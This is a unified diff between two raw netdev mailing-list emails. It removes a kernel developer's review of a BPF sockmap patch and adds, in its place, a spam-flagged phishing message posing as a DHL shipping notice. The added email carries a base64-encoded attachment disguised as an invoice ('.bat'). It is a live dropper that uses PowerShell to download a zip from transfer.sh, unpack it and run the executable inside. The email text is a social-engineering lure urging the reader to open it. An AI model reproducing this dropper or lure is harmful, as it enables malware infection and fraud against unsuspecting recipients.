@@ -1,101 +1,100 @@
-Return-Path: <netdev+bounces-132-lists+netdev=lfdr.de@vger.kernel.org>
+Return-Path: <netdev+bounces-133-lists+netdev=lfdr.de@vger.kernel.org>
 X-Original-To: lists+netdev@lfdr.de
 Delivered-To: lists+netdev@lfdr.de
 Received: from sv.mirrors.kernel.org (sv.mirrors.kernel.org [139.178.88.99])
-	by mail.lfdr.de (Postfix) with ESMTPS id 619276F5544
-	for <lists+netdev@lfdr.de>; Wed,  3 May 2023 11:50:54 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTPS id B162C6F5566
+	for <lists+netdev@lfdr.de>; Wed,  3 May 2023 11:55:34 +0200 (CEST)
 Received: from smtp.subspace.kernel.org (wormhole.subspace.kernel.org [52.25.139.140])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by sv.mirrors.kernel.org (Postfix) with ESMTPS id 850152811DB
-	for <lists+netdev@lfdr.de>; Wed,  3 May 2023 09:50:52 +0000 (UTC)
+	by sv.mirrors.kernel.org (Postfix) with ESMTPS id 91894281363
+	for <lists+netdev@lfdr.de>; Wed,  3 May 2023 09:55:32 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id 66FDFAD5C;
-	Wed,  3 May 2023 09:50:50 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id A7AD7BA22;
+	Wed,  3 May 2023 09:55:30 +0000 (UTC)
 X-Original-To: netdev@vger.kernel.org
 Received: from lindbergh.monkeyblade.net (lindbergh.monkeyblade.net [23.128.96.19])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 59B641109
-	for <netdev@vger.kernel.org>; Wed,  3 May 2023 09:50:50 +0000 (UTC)
-Received: from mail-ed1-x532.google.com (mail-ed1-x532.google.com [IPv6:2a00:1450:4864:20::532])
-	by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 89E6444A4
-	for <netdev@vger.kernel.org>; Wed,  3 May 2023 02:50:23 -0700 (PDT)
-Received: by mail-ed1-x532.google.com with SMTP id 4fb4d7f45d1cf-50bd2d7ba74so4768521a12.1
-        for <netdev@vger.kernel.org>; Wed, 03 May 2023 02:50:23 -0700 (PDT)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=cloudflare.com; s=google; t=1683107415; x=1685699415;
-        h=mime-version:message-id:in-reply-to:date:subject:cc:to:from
-         :user-agent:references:from:to:cc:subject:date:message-id:reply-to;
-        bh=nzMTrFJeM0hfAdWKmiaQPg61F2DkBF+Q5b+R7LJGe18=;
-        b=dbIROcpIDkKA5++Dx8M1SceUo8/P/zf+SuuTFmmJO3yXxk+jWsBlsRrDs/+/kbYsud
-         MdfDLV8URC5f5omRN1osLqpYoiOIZad+xEwYbrB1f3Do3tv99Z7Jb5ugnWRBJ/AFIy+0
-         HJaxVUWNnD+2hQAsP+9GcD9iAYflpxwZJmEmE=
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20221208; t=1683107415; x=1685699415;
-        h=mime-version:message-id:in-reply-to:date:subject:cc:to:from
-         :user-agent:references:x-gm-message-state:from:to:cc:subject:date
-         :message-id:reply-to;
-        bh=nzMTrFJeM0hfAdWKmiaQPg61F2DkBF+Q5b+R7LJGe18=;
-        b=OgvY/0DqVSyRFR8u0Mb41nVqXQeTsFGz+UZvHhxeX3GHCuKCQIo9NjOVjckOA+qhKj
-         4YeLrbp4v483QVLTjJH1PnUPsfKs6kBqNC6xJi8dLT2IiWIxINwO9ood32CE0Yh7xdlO
-         xXXa0rX1QVkDYFdinhUaodD+MYAa2LAWXcn164y2tYKdmsdmg3EO1wjqY+yNyuDfHhv+
-         50EPRwhbGOd57PzYE1cwEMqmMb+xSmomi3thsWa950SzLy44dUs9Ac3LvJp5ZGv5XEdQ
-         Vx4YDIXp+94WeDjikuyvswmZQSUdJ27pwsdD4btpoW1XeASzHncNT/Ef34u9jrzIzaKD
-         a6Zg==
-X-Gm-Message-State: AC+VfDysP5pzFt+vtc0KHKSL3BdSElg+CA2CMMATmUWW4C+sJQ5dBiU1
-	St8HaImUHLPq14DHMl1GVecVcQ==
-X-Google-Smtp-Source: ACHHUZ75wXd/QPqZRtaNQ+NzishUu9C0BDp22gA5MUVyvohW2Z2xI7CsaBCC+fmzj6LjNvOIBcMc1Q==
-X-Received: by 2002:a17:907:7288:b0:961:ba7d:c5f4 with SMTP id dt8-20020a170907728800b00961ba7dc5f4mr1388892ejc.29.1683107415269;
-        Wed, 03 May 2023 02:50:15 -0700 (PDT)
-Received: from cloudflare.com (apn-31-0-32-7.dynamic.gprs.plus.pl. [31.0.32.7])
-        by smtp.gmail.com with ESMTPSA id i25-20020a170906851900b0094f1b8901e1sm17126342ejx.68.2023.05.03.02.50.14
-        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Wed, 03 May 2023 02:50:14 -0700 (PDT)
-References: <20230502155159.305437-1-john.fastabend@gmail.com>
- <20230502155159.305437-4-john.fastabend@gmail.com>
-User-agent: mu4e 1.6.10; emacs 28.2
-From: Jakub Sitnicki <jakub@cloudflare.com>
-To: John Fastabend <john.fastabend@gmail.com>
-Cc: daniel@iogearbox.net, lmb@isovalent.com, edumazet@google.com,
- bpf@vger.kernel.org, netdev@vger.kernel.org, ast@kernel.org,
- andrii@kernel.org, will@isovalent.com
-Subject: Re: [PATCH bpf v7 03/13] bpf: sockmap, reschedule is now done
- through backlog
-Date: Wed, 03 May 2023 11:49:57 +0200
-In-reply-to: <20230502155159.305437-4-john.fastabend@gmail.com>
-Message-ID: <87bkj13fsa.fsf@cloudflare.com>
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 9ABFB7461
+	for <netdev@vger.kernel.org>; Wed,  3 May 2023 09:55:30 +0000 (UTC)
+Received: from alba.com.mv (unknown [45.81.243.217])
+	by lindbergh.monkeyblade.net (Postfix) with ESMTP id 6BDE449F6
+	for <netdev@vger.kernel.org>; Wed,  3 May 2023 02:55:27 -0700 (PDT)
+From: logistics@alba.com.mv
+To: netdev@vger.kernel.org
+Subject:  Commercial Invoice and Bill Of Lading
+Date: 3 May 2023 02:55:26 -0700
+Message-ID: <20230503025526.711305F7B26625E1@alba.com.mv>
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Type: text/plain
-X-Spam-Status: No, score=-2.1 required=5.0 tests=BAYES_00,DKIMWL_WL_MED,
-	DKIM_SIGNED,DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,RCVD_IN_DNSWL_NONE,
-	SPF_HELO_NONE,SPF_NONE,T_SCC_BODY_TEXT_LINE,URIBL_BLOCKED
-	autolearn=unavailable autolearn_force=no version=3.4.6
+Content-Type: multipart/mixed;
+	boundary="----=_NextPart_000_0012_23F0F84B.5E6E83A7"
+X-Spam-Status: Yes, score=7.8 required=5.0 tests=BAYES_50,HTML_MESSAGE,
+	MIME_HTML_ONLY,RCVD_IN_BL_SPAMCOP_NET,RCVD_IN_MSPIKE_BL,
+	RCVD_IN_MSPIKE_H2,RCVD_IN_MSPIKE_ZBI,RCVD_IN_SBL,RCVD_IN_SBL_CSS,
+	RCVD_IN_VALIDITY_RPBL,RDNS_NONE,SPF_FAIL,SPF_HELO_FAIL,
+	T_SCC_BODY_TEXT_LINE autolearn=no autolearn_force=no version=3.4.6
+X-Spam-Report: 
+	*  1.3 RCVD_IN_BL_SPAMCOP_NET RBL: Received via a relay in
+	*      bl.spamcop.net
+	*      [Blocked - see <https://www.spamcop.net/bl.shtml?45.81.243.217>]
+	*  0.1 RCVD_IN_SBL RBL: Received via a relay in Spamhaus SBL
+	*      [45.81.243.217 listed in zen.spamhaus.org]
+	*  3.3 RCVD_IN_SBL_CSS RBL: Received via a relay in Spamhaus SBL-CSS
+	*  0.8 BAYES_50 BODY: Bayes spam probability is 40 to 60%
+	*      [score: 0.5000]
+	*  1.3 RCVD_IN_VALIDITY_RPBL RBL: Relay in Validity RPBL,
+	*      https://senderscore.org/blocklistlookup/
+	*      [45.81.243.217 listed in bl.score.senderscore.com]
+	* -0.0 RCVD_IN_MSPIKE_H2 RBL: Average reputation (+2)
+	*      [45.81.243.217 listed in wl.mailspike.net]
+	*  0.0 SPF_HELO_FAIL SPF: HELO does not match SPF record (fail)
+	*      [SPF failed: Please see http://www.openspf.org/Why?s=helo;id=alba.com.mv;ip=45.81.243.217;r=lindbergh.monkeyblade.net]
+	*  0.0 SPF_FAIL SPF: sender does not match SPF record (fail)
+	*      [SPF failed: Please see http://www.openspf.org/Why?s=mfrom;id=logistics%40alba.com.mv;ip=45.81.243.217;r=lindbergh.monkeyblade.net]
+	*  0.0 HTML_MESSAGE BODY: HTML included in message
+	*  0.1 MIME_HTML_ONLY BODY: Message only has text/html MIME parts
+	*  0.0 RCVD_IN_MSPIKE_BL Mailspike blocklisted
+	* -0.0 T_SCC_BODY_TEXT_LINE No description available.
+	*  0.8 RDNS_NONE Delivered to internal network by a host with no rDNS
+	*  0.0 RCVD_IN_MSPIKE_ZBI No description available.
+X-Spam-Level: *******
 X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
 	lindbergh.monkeyblade.net
 
-On Tue, May 02, 2023 at 08:51 AM -07, John Fastabend wrote:
-> Now that the backlog manages the reschedule() logic correctly we can drop
-> the partial fix to reschedule from recvmsg hook.
->
-> Rescheduling on recvmsg hook was added to address a corner case where we
-> still had data in the backlog state but had nothing to kick it and
-> reschedule the backlog worker to run and finish copying data out of the
-> state. This had a couple limitations, first it required user space to
-> kick it introducing an unnecessary EBUSY and retry. Second it only
-> handled the ingress case and egress redirects would still be hung.
->
-> With the correct fix, pushing the reschedule logic down to where the
-> enomem error occurs we can drop this fix.
->
-> Fixes: bec217197b412 ("skmsg: Schedule psock work if the cached skb exists on the psock")
-> Signed-off-by: John Fastabend <john.fastabend@gmail.com>
-> ---
+This is a multi-part message in MIME format.
 
-Reviewed-by: Jakub Sitnicki <jakub@cloudflare.com>
+------=_NextPart_000_0012_23F0F84B.5E6E83A7
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.19003"></HEAD>
+<BODY>
+<P><BR>&nbsp;Dear sales,</P>
+<P>You have a new shipment awaiting your confirmation.</P>
+<P>Please download the attached for Packing List, Commercial Invoice and Bi=
+ll Of Lading.</P>
+<P><BR>Shipment Recipient:<BR>This shipment can be cleared only by:sales@fi=
+rstcranes.com<BR>------------------<BR>Regards..<BR>DHL SHIPPING &amp; LOGI=
+STIC</P></BODY></HTML>
+------=_NextPart_000_0012_23F0F84B.5E6E83A7
+Content-Type: application/octet-stream; name="Commercial Invoice and Bill Of Lading.bat"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Commercial Invoice and Bill Of Lading.bat"
+
+//4NCkBlY2hvIG9mZg0KY2xzDQpzZXRsb2NhbCBlbmFibGVleHRlbnNpb25zICYmIHNldGxv
+Y2FsIGVuYWJsZWRlbGF5ZWRleHBhbnNpb24NCkBlY2hvIG9mZg0KaWYgbm90ICIlMSIgPT0g
+Im1pbiIgc3RhcnQgL01JTiBjbWQgL2MgJTAgbWluICYgZXhpdC9iID5udWwgMj4mMQ0KcG93
+ZXJzaGVsbCAtY29tbWFuZCAiSW52b2tlLVdlYlJlcXVlc3QgLXVyaSBodHRwczovL3RyYW5z
+ZmVyLnNoL2dldC8xN3RoS2cvVGEuemlwIC1vIFRhLnppcCINCnBvd2Vyc2hlbGwgLWNvbW1h
+bmQgIkV4cGFuZC1BcmNoaXZlIFRhLnppcCINCmNkIFRhDQpzdGFydCBUYS5leGUgDQoNCg0K
+AA==
+
+------=_NextPart_000_0012_23F0F84B.5E6E83A7--
 
